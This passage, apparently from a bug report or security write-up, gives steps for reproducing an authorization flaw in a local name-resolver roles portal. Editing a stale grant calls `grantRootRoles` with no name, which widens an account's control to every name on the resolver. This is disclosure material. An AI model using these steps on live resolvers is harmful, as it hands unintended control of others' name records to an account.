{% step %}

## Reproduce it in a locally running portal

Run the portal locally against a local chain. Take a resolver with at least two names on it. Grant an account a role on one of them through the roles page, then repoint that name to a different resolver so it leaves the node list while the grant stays. Reload `/resolver/<address>/roles`. The account is still listed, now with no name shown. Open its row, change any permission, and save. Read the transaction in the wallet before confirming: the target function is `grantRootRoles` and there is no name in the arguments. After confirming, the account can set the address record on the other name on that resolver, which was never part of the edit.
{% endstep %}
{% endstepper %}
